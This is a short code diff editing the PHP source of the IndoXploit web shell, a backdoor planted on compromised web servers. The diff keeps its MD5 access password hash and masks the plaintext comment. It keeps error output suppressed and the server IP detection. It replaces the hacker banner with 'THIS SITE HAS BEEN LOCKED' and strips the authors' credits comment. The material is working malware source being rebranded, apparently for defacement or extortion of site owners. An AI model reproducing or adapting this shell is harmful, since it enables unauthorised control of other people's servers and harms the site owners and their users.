@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "4f58b9c8f953b2a124d6af21eb097182"; # md5: H3YH4X
+$password = "4f58b9c8f953b2a124d6af21eb097182"; # md5: H*YH*X
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
@@ -59,7 +59,7 @@ input[type=password] {
 <header>
 	<pre>
  ___________________________
-< root@indoxploit:~# w00t??? >
+< THIS SITE HAS BEEN LOCKED >
  ---------------------------
    \         ,        ,
     \       /(        )`
@@ -118,17 +118,6 @@ if(get_magic_quotes_gpc()) {
 ?>
 <!DOCTYPE HTML>
 <html>
-<!--
-###############################################################################
-// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
-// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
-// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
-// Tanpa kalian kita tidak akan BESAR seperti sekarang.
-// Greetz: All Member IndoXploit. & All My Friends.
-###############################################################################
-// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
-###############################################################################
--->
 <head>
 <title>IndoXploit</title>
 <meta name='author' content='IndoXploit'>
